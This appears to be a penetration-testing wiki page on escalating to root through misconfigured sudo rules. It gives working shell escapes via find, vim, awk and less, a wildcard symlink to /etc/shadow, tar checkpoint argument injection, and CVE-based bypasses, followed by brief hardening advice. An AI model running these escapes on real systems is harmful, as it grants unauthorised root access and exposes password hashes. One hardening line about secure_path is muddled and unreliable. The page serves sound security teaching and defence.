---
title: sudo misconfiguration
slug: sudo-misconfig
---

> **TL;DR:** `sudo -l` is the first command after a foothold; sudoers rules that NOPASSWD a flexible binary, wildcard a path, preserve dangerous env vars, or use loose runas patterns convert directly into root.

## What it is
`sudo` consults `/etc/sudoers` (plus `/etc/sudoers.d/*`) to decide whether a user may run a command as another. The grammar is rich enough to express subtle policies — and easy enough to get wrong that almost every Linux engagement has at least one exploitable sudo rule.

## Preconditions / where it applies
- Local shell on a Linux host that uses sudo
- A sudoers rule that lists the current user (or a group they're in) with one of the dangerous patterns below
- For env-keep variants, the binary you can run must honour the env var

## Technique

**Step 1 — enumerate:**
```bash
sudo -l                    # the canonical command
cat /etc/sudoers 2>/dev/null
ls /etc/sudoers.d/ 2>/dev/null
```

**Pattern A — NOPASSWD on a GTFOBins binary.** GTFOBins lists ~370 binaries with documented sudo-context escapes. If `sudo -l` returns `(root) NOPASSWD: /usr/bin/find`, look up the "Sudo" tab:
```bash
sudo find . -exec /bin/sh \; -quit
sudo less /etc/hostname    # then !sh
sudo vim -c ':!sh'
sudo awk 'BEGIN {system("/bin/sh")}'
```

**Pattern B — wildcard expansion.** A rule like `(root) /usr/bin/cat /var/log/*.log` looks safe but the shell expands `*` *before* sudo sees it:
```bash
ln -s /etc/shadow /var/log/x.log
sudo cat /var/log/*.log
```
Worse — `(root) /bin/tar czf /backup.tgz /home/user/*` lets an attacker drop files in `/home/user/` named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh`.

**Pattern C — env_keep.** `Defaults env_keep += "LD_PRELOAD"` (or `PYTHONPATH`, `RUBYLIB`, `PERL5LIB`, `NODE_OPTIONS`, `GTK_MODULES`) lets the attacker inject code through the standard library loaders. See [[ld-preload-abuse]].

**Pattern D — `!` negation bypasses.** `(ALL, !root) /bin/bash` was supposed to allow bash as any user *except* root. CVE-2019-14287 in sudo < 1.8.28: passing UID -1 (or 4294967295) bypassed the check:
```bash
sudo -u#-1 /bin/bash
```

**Pattern E — runas patterns and groups.** `(%admin) ALL` grants ALL only to members of group `admin`, but `(ALL:ALL)` includes group-runas. A NOPASSWD with `(ALL:ALL)` lets you `sudo -g root` even if the user runas is more restricted.

**Pattern F — sudoedit / SUDO_EDITOR.** `sudoedit` honours `SUDO_EDITOR`/`VISUAL`/`EDITOR` env vars:
```bash
EDITOR='vim -c ":!sh"' sudoedit /etc/hostname
```

**Pattern G — old sudo CVEs.** CVE-2021-3156 (Baron Samedit) — heap overflow in `sudo` 1.8.2–1.9.5p1, exploitable by any local user. CVE-2023-22809 — sudoedit arbitrary file write via `EDITOR='vim -- /etc/passwd'`. Always fingerprint `sudo --version` early.

**Pattern H — pwfeedback / TTY-less.** CVE-2019-18634: `pwfeedback` (off by default) + non-tty stdin = stack overflow → root.

## Detection and defence
- Use `visudo -c` and a CI policy linter (`cvechecker`, `sudo_audit`)
- Prefer explicit absolute binaries with explicit args; never use shell metacharacters in command specs
- Default `Defaults secure_path`, `Defaults !env_reset` should remain off
- Use `Defaults timestamp_timeout=0` to require password each invocation in high-value tiers
- Keep sudo current — multiple wormable bugs in the last five years
- AuditD: `auditctl -w /etc/sudoers -p wa -k sudo_policy_change`

## References
- [GTFOBins — sudo](https://gtfobins.github.io/#+sudo) — per-binary escape payloads
- [sudoers(5)](https://man7.org/linux/man-pages/man5/sudoers.5.html) — grammar and security-relevant defaults
- [Sudo Security Advisories](https://www.sudo.ws/security/advisories/) — CVE history

Related: [[ld-preload-abuse]], [[suid-sgid-binaries]], [[linux-privesc-vectors]].
